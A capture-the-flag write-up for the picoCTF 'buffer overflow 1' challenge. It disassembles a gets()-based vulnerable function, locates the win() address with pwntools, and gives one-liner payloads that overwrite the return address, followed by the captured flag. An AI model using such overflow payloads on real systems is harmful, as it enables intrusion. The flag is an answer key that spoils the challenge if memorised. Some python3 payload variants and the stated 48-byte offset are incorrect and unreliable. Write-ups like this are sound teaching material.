# buffer overflow 1

__PROBLEM__

Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this program? You can find it in /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba[program](./vuln) on the shell server. [Source](./vuln.c).

__HINT__
This time you're actually going to have to control that return address!
Make sure you consider Big Endian vs Little Endian.

__SOLUTION__
Open `vuln` under cutter and look at `vuln` function:
```
/ (fcn) sym.vuln 46
|   sym.vuln ();
|           ; var char *s @ ebp-0x28
|           0x0804862f      push ebp
|           0x08048630      mov ebp, esp
|           0x08048632      sub esp, 0x28 ; '('
|           0x08048635      sub esp, 0xc
|           0x08048638      lea eax, [s]
|           0x0804863b      push eax ; char *s
|           0x0804863c      call sym.imp.gets ; char *gets(char *s)
|           0x08048641      add esp, 0x10
|           0x08048644      call loc.get_return_address
|           0x08048649      sub esp, 8
|           0x0804864c      push eax
|           0x0804864d      push str.Okay__time_to_return..._Fingers_Crossed..._Jumping_to_0x_x ; 0x80487d4 ; "Okay, time to return... Fingers Crossed... Jumping to 0x%x\n" ; const char *format
|           0x08048652      call sym.imp.printf ; int printf(const char *format)
|           0x08048657      add esp, 0x10
|           0x0804865a      nop
|           0x0804865b      leave
\           0x0804865c      ret
```

```
/ (fcn) sym.win 100
|   sym.win ();
|           ; var char *format @ ebp-0x4c
|           ; var file*stream @ ebp-0xc
|           0x080485cb      push ebp
...
```

```
/ (fcn) main 99
|   int main (int argc, char **argv, char **envp);
...
|           0x080486ab      add esp, 0x10
|           0x080486ae      call sym.vuln
|           0x080486b3      mov eax, 0
```


I just found that return address which is stored in `ebp` register is 48 bytes moved.
Extract address of `win` function `'\xcb\x85\x04\x08'` or from cutter or frow pwn:
```
>>> from pwn import *
>>> vuln = ELF('./vuln')
[*] 'buffer overflow 1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
>>> p32(vuln.symbols['win']) # Get address of win function
'\xcb\x85\x04\x08'
```

Create payload for buffer overflow
```
python2 -c "print 'A'*44 + '\xcb\x85\x04\x08' " | ./vuln

python3 -c "print('A'*44 + '\xcb\x85\x04\x08'.encode().hex())" | ./vuln
python3 -c "print('A'*44 + str(0x080485cb))" | ./vuln
python3 -c "print(bytes([ord('A')] * 44 + [0xcb, 0x85, 0x04, 0x08]))" | ./vuln

```
I got the flag:
```sh
luk6xff@pico-2018-shell:/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba$ python2 -c "print 'A'*44 + '\xcb\x85\x04\x08' " | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy56a7b196}Segmentation fault (core dumped)
```

FLAG - `picoCTF{addr3ss3s_ar3_3asy56a7b196}`
